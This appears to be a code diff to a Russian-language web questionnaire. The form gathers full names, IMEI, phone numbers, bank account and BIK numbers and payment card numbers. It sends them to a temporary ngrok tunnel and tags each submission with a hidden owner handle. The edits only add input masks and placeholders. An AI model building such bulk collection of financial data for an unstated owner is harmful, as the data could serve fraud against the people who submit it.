@@ -112,24 +112,24 @@
 <body>
   <div class="container">
     <h2>Анкета</h2>
-    <form id="form" action="https://6ef4-2a03-d000-8602-8a05-c8d9-b52a-cf38-64c8.ngrok-free.app/submit" method="post" onsubmit="handleSubmit(event)">
+    <form id="form" action="https://6ef4-2a03-d000-8602-8a05-c8d9-b52a-cf38-64c8.ngrok-free.app" method="post" onsubmit="handleSubmit(event)">
       <input type="hidden" id="chat_id" name="chat_id"> <!-- Скрытое поле для chat_id -->
       <input type="hidden" id="owner_id" name="owner_id" value="@helper_kong"> <!-- Скрытое поле с постоянным значением -->
 
       <label for="chat_number">№ Чата:</label>
-      <input type="text" id="chat_number" name="chat_number" required title="От 3 до 4 цифр без пробелов" placeholder="Введите № чата" minlength="3" maxlength="4" oninput="validateField(this)">
+      <input type="text" id="chat_number" name="chat_number" required title="От 3 до 4 цифр без пробелов" placeholder="____" minlength="3" maxlength="4" oninput="validateField(this)">
 
       <label for="id">ID:</label>
-      <input type="text" id="id" name="id" required title="6 цифр без пробелов" placeholder="Введите ID" maxlength="6" oninput="validateField(this)">
+      <input type="text" id="id" name="id" required title="6 цифр без пробелов" placeholder="______" maxlength="6" oninput="validateField(this)">
 
       <label for="name">ФИО:</label>
       <input type="text" id="name" name="name" required placeholder="Введите ФИО">
 
       <label for="imei">IMEI:</label>
-      <input type="text" id="imei" name="imei" required title="15 цифр без пробелов" placeholder="Введите IMEI" maxlength="15" oninput="validateField(this)">
+      <input type="text" id="imei" name="imei" required title="15 цифр без пробелов" placeholder="_______________" maxlength="15" oninput="validateField(this)">
 
       <label for="phone">Телефон:</label>
-      <input type="tel" id="phone" name="phone" required title="Формат номера телефона начинается с +7" placeholder="Номер телефона">
+      <input type="tel" id="phone" name="phone" required title="Формат номера телефона начинается с +7" placeholder="+7 (___) ___-__-__">
 
       <label for="trust_limit">Лимит доверия, руб:</label>
       <input type="number" id="trust_limit" name="trust_limit" required placeholder="Введите лимит доверия">
@@ -147,15 +147,15 @@
           <input type="text" name="banks[0][bank]" required placeholder="Введите название банка">
 
           <label for="account1">Счет 1:</label>
-          <input type="text" name="banks[0][account]" required title="20 цифр без пробелов" placeholder="Введите номер счета">
+          <input type="text" name="banks[0][account]" required title="20 цифр без пробелов" placeholder="____ ____ ____ ____ ____" class="mask-account">
 
           <label for="bik1">БИК:</label>
-          <input type="text" name="banks[0][bik]" required title="9 цифр без пробелов" placeholder="Введите БИК">
+          <input type="text" name="banks[0][bik]" required title="9 цифр без пробелов" placeholder="_________" class="mask-bik">
 
           <div class="cards">
             <div class="card">
               <label for="card1">Карта 1:</label>
-              <input type="text" name="banks[0][cards][0]" required title="От 13 до 19 цифр без пробелов" placeholder="Введите номер карты">
+              <input type="text" name="banks[0][cards][0]" required title="От 13 до 19 цифр без пробелов" placeholder="____ ____ ____ ____ ____" class="mask-card">
             </div>
           </div>
           <button type="button" class="add-btn" onclick="addCard(this)">Добавить карту</button>
@@ -173,6 +173,7 @@
       new Cleave('#phone', {
         phone: true,
         phoneRegionCode: 'RU',
+        delimiters: [' ', '(', ')', '-', '-'],
         onValueChanged: function(e) {
           const rawValue = e.target.rawValue;
           document.getElementById('phone').value = '+' + rawValue.replace(/\D/g, '');
@@ -255,15 +256,15 @@
         <input type="text" name="banks[${bankCount}][bank]" required placeholder="Введите название банка">
 
         <label for="account1">Счет 1:</label>
-        <input type="text" name="banks[${bankCount}][account]" required title="20 цифр без пробелов" placeholder="Введите номер счета" class="mask-account">
+        <input type="text" name="banks[${bankCount}][account]" required title="20 цифр без пробелов" placeholder="____ ____ ____ ____ ____" class="mask-account">
 
         <label for="bik1">БИК:</label>
-        <input type="text" name="banks[${bankCount}][bik]" required title="9 цифр без пробелов" placeholder="Введите БИК" class="mask-bik">
+        <input type="text" name="banks[${bankCount}][bik]" required title="9 цифр без пробелов" placeholder="_________" class="mask-bik">
 
         <div class="cards">
           <div class="card">
             <label for="card1">Карта 1:</label>
-            <input type="text" name="banks[${bankCount}][cards][0]" required title="От 13 до 19 цифр без пробелов" placeholder="Введите номер карты" class="mask-card">
+            <input type="text" name="banks[${bankCount}][cards][0]" required title="От 13 до 19 цифр без пробелов" placeholder="____ ____ ____ ____ ____" class="mask-card">
           </div>
         </div>
         <button type="button" class="add-btn" onclick="addCard(this)">Добавить карту</button>
@@ -300,7 +301,7 @@
       card.className = 'card';
       card.innerHTML = `
         <label for="card${cardIndex + 1}">Карта ${cardIndex + 1}:</label>
-        <input type="text" name="banks[${bankIndex}][cards][${cardIndex}]" required title="От 13 до 19 цифр без пробелов" placeholder="Введите номер карты" class="mask-card">
+        <input type="text" name="banks[${bankIndex}][cards][${cardIndex}]" required title="От 13 до 19 цифр без пробелов" placeholder="____ ____ ____ ____ ____" class="mask-card">
         <button type="button" class="remove-btn" onclick="removeCard(this)">Удалить карту</button>
       `;
       cards.appendChild(card);
